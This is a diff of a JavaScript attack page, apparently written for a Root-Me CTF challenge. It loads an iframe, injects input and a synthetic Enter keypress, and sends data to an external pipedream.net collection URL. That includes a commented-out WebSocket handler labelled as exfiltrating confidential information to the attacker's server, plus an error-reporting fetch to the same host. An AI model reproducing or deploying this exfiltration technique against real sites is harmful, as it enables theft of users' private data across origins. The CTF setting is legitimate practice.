@@ -27,6 +27,22 @@
         iframe.height = '80%';
         iframe.width = '80%';
         iframe.onload = function() {
+
+        	try {
+        		const event = new KeyboardEvent('keydown', {
+				  key: 'Enter',
+				  code: 'Enter',
+				  which: 13,
+				  keyCode: 13,
+				});
+
+			  	document.getElementById('input').value='hello';
+	            document.getElementById('input').dispatchEvent(event);
+	            
+            } catch (error) {
+			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr='+error, {mode: 'no-cors'})
+			}
+        	/*
         	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
 			ws.onopen = start
 			ws.onmessage = handleReply
@@ -37,6 +53,7 @@
 			  //Exfiltrate the confidential information to attackers server
 			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?cba='+event.data, {mode: 'no-cors'})
 			}
+			*/
         };
         document.getElementsByTagName('body')[0].appendChild(iframe);
 	</script>
